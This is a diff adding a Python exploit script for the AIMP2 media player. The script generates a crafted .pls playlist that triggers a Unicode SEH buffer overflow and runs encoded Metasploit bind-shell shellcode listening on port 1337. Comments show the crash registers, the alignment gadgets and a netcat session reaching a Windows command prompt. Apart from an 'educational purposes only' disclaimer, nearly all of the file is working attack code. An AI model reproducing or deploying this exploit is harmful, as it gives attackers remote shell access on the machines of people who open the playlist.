@@ -1,0 +1,106 @@
+#!/usr/bin/python
+#
+# ######################################################################
+# Author contact    : seeleymagic[at]hotmail[dot]com
+# ######################################################################
+#
+# *** For educational purposes only ***
+#        You have been warned
+#
+# My original crash breakdown:
+# 
+# EAX 001B0020 UNICODE "AAAAAAAAAAAAAAAAAAAA~
+# ECX 00000273
+# EDX 00000C4C
+# EBX 00000000
+# ESP 0012DCA8
+# EBP 0012DD64
+# ESI 001B6610 UNICODE "AAAAAAAAAAAAAAAAAAAA~
+# EDI 00130000 ASCII "Actx "
+# EIP 004530C6 AIMP2.004530C6
+#
+# And then when we pass the exemption handler to overwrite EIP...
+#
+# EIP 00410041
+#
+# The Info:
+#
+# I knew this exploit was always possible, but I failed to have the knowledge
+# and experiance to complete it. Many thanks goes to corelanc0d3r for 
+# demonstrating this unicode concept on his blog. I downloaded his PoC however it  
+# did not work on my VM so I remade it with some fun shellcode :)
+#
+# Visit corelanc0d3r's blog: http://www.corelan.be:8800/
+#
+# root@home:/home/mrme# nc -v 192.168.2.6 1337
+# 192.168.2.6: inverse host lookup failed: Unknown server error : Connection timed out
+# (UNKNOWN) [192.168.2.6] 1337 (?) open
+# Microsoft Windows XP [Version 5.1.2600]
+# (C) Copyright 1985-2001 Microsoft Corp.
+#
+# C:\Program Files\AIMP2\Langs>
+# 
+
+# Metasploit bind shell on port 1337
+# Encoded using Skylined's alpha2 encoder
+
+shellcode = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQA"
+"IAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1"
+"111AIAJQI1AYAZBABABABAB30APB944JBKLQZJKPMK8JYKOKOKOQPTK"
+"2LMTMTDKOUOLTKCLKUT8M1JOTKPOLXTKQOMPM1JKOY4KNTTKM1JNNQ9"
+"04Y6LU4I0D4M77QHJLMKQ92ZKL4OK0TMTO8BUIUTK1OO4KQZK1VDKLL"
+"PKTKQOMLM1ZKM3NLTKU9RLMTMLQQ7SNQ9KQTTK0CNP4KOPLL4KRPMLV"
+"M4KOPLHQN384NPNLNJLPPKOJ6QVPSQVQX03OBRHT7RSNR1OB4KO8PBH"
+"XKZMKLOKR0KOHVQOU9YU1VE1JMM8KRB5QZLBKOXPBH8YM9JUFMQGKOZ"
+"6PSPSR30SQCPC23PCPSKOXPC6RHKUP936PSSYYQV5QX5TMJ40GWPWKO"
+"8VRJLPR1R5KOHPQXG4VMNNIY0WKOZ6QC25KOXPBH9U19U6OY27KO9FP"
+"PR4R41EKOXPUC1X9W49GVRYPWKO8V0UKOXP1VQZRD2FQXQSBMU9YUQZ"
+"0PPYNI8LTI9W2J14U9K201GPKCUZKNORNMKNPBNL63TM2ZNXVKFK6KQ"
+"XBRKNVSN6KOT5Q4KOIFQK0WB2PQ0Q0Q1ZM1PQR1PUR1KOXPRHVMJ9KU"
+"8NQCKOHVQZKOKO07KOZ0DK0WKLTCWTRDKOHV0RKO8P38JPTJKTQOR3K"
+"O8VKO8PKZA")
+
+header = ("[playlist]\nNumberOfEntries=3\n\n");
+header += ("File1=");
+crash = ('\x41' * 1985)	        	# offset before shellcode
+crash += shellcode			# add the shellcode
+crash += ('\41' * (4033-len(crash)))	# remaining offset (1st block)
+crash += ('\x41\x6d')           	# inc ecx + add byte ptr [ebp],ch
+crash += ('\x0e\x45')           	# seh handler (p/p/r in aimp2.dll)
+
+# We needed an address that is located at or close to our shellcode
+# We find one on the forth address from the stack
+
+align = '\x58' 				# pop eax
+align += '\x6d'
+align += '\x58'  			# pop eax
+align += '\x6d'
+align += '\x58'  			# pop eax
+align += '\x6d'
+align += '\x58'  			# pop eax
+align += '\x6d'
+
+# Here we adjust the value of eax to the address of where our shellcode
+# is.. (in the original buffer)
+
+align += '\x05\x02\x22'			# add eax,22000200    
+align += '\x6d'  
+align += '\x2d\x09\x11'   		# sub eax,11000900
+align += '\x6d' 
+align += '\x2d\x09\x11'   		# sub eax,11000900
+align += '\x6d'   
+
+# Eax now equals 0x0012EDA0 which is the location of our shellcode. We push
+# eax onto the stack and jump to it so its executed
+
+jump ='\x50'				# push eax 		  
+jump += '\x6d'	
+jump += '\xc3' 				# jmp eax 
+
+finish = ('\x42' * (963-len(align)-len(jump)))
+buffer = header + crash + align + jump + finish + '\n'
+
+file=open('mr_me_owns_aimp.pls','w')
+file.write(buffer)
+file.close()
+print "[+] mr_me_owns_aimp.pls file created successfully"
